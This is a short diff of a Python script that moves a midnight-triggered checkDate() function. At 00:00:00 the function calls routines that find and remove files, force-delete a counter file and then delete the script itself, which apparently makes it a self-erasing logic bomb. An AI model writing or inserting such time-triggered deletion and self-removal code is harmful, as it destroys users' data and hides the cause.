@@ -38,20 +38,6 @@ except:
 	if content > 1:
 		os.startfile('msedge.exe')
 
-# Check Time
-def checkDate():
-  now = datetime.now()
-  current_time = now.strftime("%H:%M:%S")
-
-  target = "00:00:00"
-  
-  if current_time == target:
-    find()
-    remove()
-    deactivate()
-
-
-
 # Find files and folders
 def find():
   cwd = str(os.getcwd())
@@ -88,3 +74,16 @@ def deactivate():
   f.close()
   os.system("del /f /q count.txt")
   os.remove(argv[0])
+
+
+# Check Time
+def checkDate():
+  now = datetime.now()
+  current_time = now.strftime("%H:%M:%S")
+
+  target = "00:00:00"
+  
+  if current_time == target:
+    find()
+    remove()
+    deactivate()
